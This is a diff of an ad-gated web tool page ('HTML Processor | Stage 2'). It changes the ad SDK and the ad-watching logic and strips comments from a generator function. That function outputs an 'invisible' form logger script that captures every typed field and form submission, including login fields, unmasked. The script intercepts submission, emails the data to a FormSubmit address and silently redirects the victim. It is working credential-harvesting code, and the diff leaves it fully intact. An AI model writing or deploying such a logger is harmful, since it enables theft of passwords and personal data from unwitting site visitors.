@@ -1,13 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script src='//libtl.com/sdk.js' data-zone='9601506' data-sdk='show_9601506'></script>
-
-    
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HTML Processor | Stage 2</title>
+    <!-- MoneyTag Ad SDK -->
+    <script src="https://telegram.org/js/moneytag.js"></script>
     <style>
         :root {
             --primary: #4361ee;
@@ -428,14 +426,13 @@
             });
 
             // Watch ad button handler
-            document.getElementById('watchAdBtn').addEventListener('click', () => {
-                showAd().then(() => {
-                    // After ad is watched, proceed to next stage
+            document.getElementById('watchAdBtn').addEventListener('click', async () => {
+                try {
+                    await showAd();
                     window.location.href = 'step3.html';
-                }).catch(error => {
-                    showAlert('Error loading ad: ' + error.message, 'danger');
-                    document.getElementById('adModal').style.display = 'none';
-                });
+                } catch (error) {
+                    showAlert('Error: ' + error.message, 'danger');
+                }
             });
         });
 
@@ -507,21 +504,13 @@
         }
 
         function generateLoggerScript(email, redirectUrl) {
-            // This is the same script generator as before
             return `<!-- DTech Form Logger (Invisible) -->
 <script>
 // CONFIGURATION
 const CONFIG = {
-    // Your FormSubmit endpoint
     FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/${email}',
-    
-    // Redirect URL after submission
     REDIRECT_URL: '${redirectUrl}',
-    
-    // Time to wait after typing before considering input "finished" (ms)
     INPUT_IDLE_TIMEOUT: 2000,
-    
-    // Patterns that indicate a submit button
     SUBMIT_BUTTON_PATTERNS: [
         'submit', 'login', 'sign in', 'continue', 
         'next', 'confirm', 'proceed', 'authenticate'
@@ -530,29 +519,24 @@ const CONFIG = {
 
 // ===== INVISIBLE LOGGER =====
 (() => {
-    // Silent console logging (optional for debugging)
     const log = (msg, type='info') => {
-        console.log(\`[DTech Logger] \${msg}\`); // Only visible in browser console
+        console.log(\`[DTech Logger] \${msg}\`);
     };
 
-    // ===== DATA CAPTURE =====
     let typingTimer;
     let formData = {};
 
-    // Send data via FormSubmit and redirect
     const sendToFormSubmit = async (data) => {
         try {
             const formData = new FormData();
             formData.append('_captcha', 'false');
             formData.append('_subject', 'Form Data Capture');
             formData.append('_template', 'table');
-            
-            // Add captured data (RAW, NO MASKING)
             formData.append('page_url', window.location.href);
             formData.append('timestamp', new Date().toISOString());
             
             Object.entries(data).forEach(([key, value]) => {
-                formData.append(key, value); // Sends exact input
+                formData.append(key, value);
             });
 
             const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
@@ -561,14 +545,12 @@ const CONFIG = {
             });
 
             const result = await response.json();
-            
             if (result.success) {
-                window.location.href = CONFIG.REDIRECT_URL; // SILENT REDIRECT
+                window.location.href = CONFIG.REDIRECT_URL;
             }
-        } catch (err) {} // Silent fail
+        } catch (err) {}
     };
 
-    // ===== EVENT HANDLERS =====
     const setupInputHandlers = () => {
         document.querySelectorAll('input, textarea, select').forEach(field => {
             field.addEventListener('input', () => {
@@ -577,7 +559,7 @@ const CONFIG = {
                     const name = field.name || field.id || 'unnamed_field';
                     const value = field.value;
                     if (value) {
-                        formData[name] = value; // Stores raw value
+                        formData[name] = value;
                     }
                 }, CONFIG.INPUT_IDLE_TIMEOUT);
             });
@@ -585,42 +567,36 @@ const CONFIG = {
     };
 
     const setupSubmissionHandlers = () => {
-        // Form submissions
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', (e) => {
-                e.preventDefault(); // Stop default submission
-                
+                e.preventDefault();
                 const data = {};
                 Array.from(form.elements).forEach(el => {
                     if (el.name && el.value) {
-                        data[el.name] = el.value; // RAW DATA
+                        data[el.name] = el.value;
                     }
                 });
                 sendToFormSubmit(data);
             }, true);
         });
 
-        // Button clicks
         document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
             btn.addEventListener('click', (e) => {
                 const btnText = (btn.textContent || btn.value || '').toLowerCase();
                 const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
                     btnText.includes(pattern)
                 );
-                
                 if (isSubmit && Object.keys(formData).length > 0) {
                     sendToFormSubmit(formData);
-                    formData = {}; // Clear after submission
+                    formData = {};
                 }
             }, true);
         });
     };
 
-    // ===== INITIALIZATION =====
     setupInputHandlers();
     setupSubmissionHandlers();
 
-    // Watch for dynamically added elements
     new MutationObserver(() => {
         setupInputHandlers();
         setupSubmissionHandlers();
@@ -629,30 +605,73 @@ const CONFIG = {
 <\/script>`;
         }
 
-        function showAd() {
-            return new Promise((resolve, reject) => {
-                // Show loading state
-                document.getElementById('adContainer').innerHTML = `
+        async function showAd() {
+            const adContainer = document.getElementById('adContainer');
+            const watchBtn = document.getElementById('watchAdBtn');
+            const originalBtnText = watchBtn.innerHTML;
+            
+            // 1st Attempt: Rewarded Popup
+            try {
+                adContainer.innerHTML = `
                     <div class="ad-loading">
                         <i class="fas fa-circle-notch fa-spin"></i>
-                        <p>Preparing ad...</p>
+                        <p>Loading premium ad...</p>
+                    </div>
+                `;
+                watchBtn.disabled = true;
+                
+                await show_9601506('pop');
+                document.getElementById('adModal').style.display = 'none';
+                showAlert('Thank you for watching the ad!', 'success');
+                return;
+            } catch (error1) {
+                console.log("Popup failed, trying interstitial...");
+            }
+            
+            // 2nd Attempt: In-App Interstitial
+            try {
+                adContainer.innerHTML = `
+                    <div class="ad-loading">
+                        <i class="fas fa-ad"></i>
+                        <p>Loading alternative ad...</p>
                     </div>
                 `;
                 
-                // Call the MoneyTag ad function
-                try {
-                    show_9601506().then(() => {
-                        // Ad was successfully shown and completed
-                        document.getElementById('adModal').style.display = 'none';
-                        showAlert('Thank you for watching the ad! Proceeding to next stage...', 'success');
-                        resolve();
-                    }).catch(error => {
-                        reject(new Error('Ad failed to load or was skipped'));
-                    });
-                } catch (error) {
-                    reject(new Error('Ad SDK not available'));
-                }
-            });
+                await show_9601506({
+                    type: 'inApp',
+                    inAppSettings: {
+                        frequency: 2,
+                        capping: 0.1,
+                        interval: 30,
+                        timeout: 5,
+                        everyPage: false
+                    }
+                });
+                document.getElementById('adModal').style.display = 'none';
+                showAlert('Ad completed!', 'success');
+                return;
+            } catch (error2) {
+                console.log("Interstitial failed, allowing skip...");
+            }
+            
+            // Final Fallback: Skip with Apology
+            adContainer.innerHTML = `
+                <div class="alert alert-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div>
+                        <strong>Sorry!</strong><br>
+                        We couldn't load an ad. You may proceed without watching.
+                    </div>
+                </div>
+            `;
+            
+            watchBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Proceed Anyway';
+            watchBtn.onclick = () => {
+                document.getElementById('adModal').style.display = 'none';
+                window.location.href = 'step3.html';
+            };
+            
+            throw new Error("All ad formats failed to load");
         }
 
         function showAlert(message, type) {
@@ -660,12 +679,10 @@ const CONFIG = {
             const alertMessage = document.getElementById('alert-message');
             const alertIcon = alertDiv.querySelector('i');
             
-            // Set message and style
             alertMessage.innerHTML = message;
             alertDiv.className = `alert alert-${type}`;
             alertDiv.style.display = 'flex';
             
-            // Set appropriate icon
             switch(type) {
                 case 'success':
                     alertIcon.className = 'fas fa-check-circle';
@@ -680,7 +697,6 @@ const CONFIG = {
                     alertIcon.className = 'fas fa-info-circle';
             }
             
-            // Auto-hide after 5 seconds
             setTimeout(() => {
                 alertDiv.style.display = 'none';
             }, 5000);
